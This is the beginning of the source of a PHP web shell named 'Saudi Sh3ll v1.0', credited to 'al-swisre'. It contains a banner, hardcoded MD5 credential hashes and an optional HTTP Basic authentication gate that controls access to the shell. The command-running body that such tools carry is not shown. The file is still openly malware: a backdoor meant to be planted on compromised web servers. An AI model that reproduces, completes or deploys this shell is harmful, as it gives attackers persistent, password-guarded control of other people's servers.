<?php
########################################\
#                                        #
#            Saudi Sh3ll v1.0            #
#                                        #
#             by al-swisre               #
#                                        #
########################################/


$auth = 0;
$name='53c2b3524e98b04d105304b7aa5dc97e'; // Saudi
$pass='f5f091a697cd91c4170cda38e81f4b1a'; // Saudi
if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="Saudi Sh3ll v1.0"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b></b>");
   }
}
?>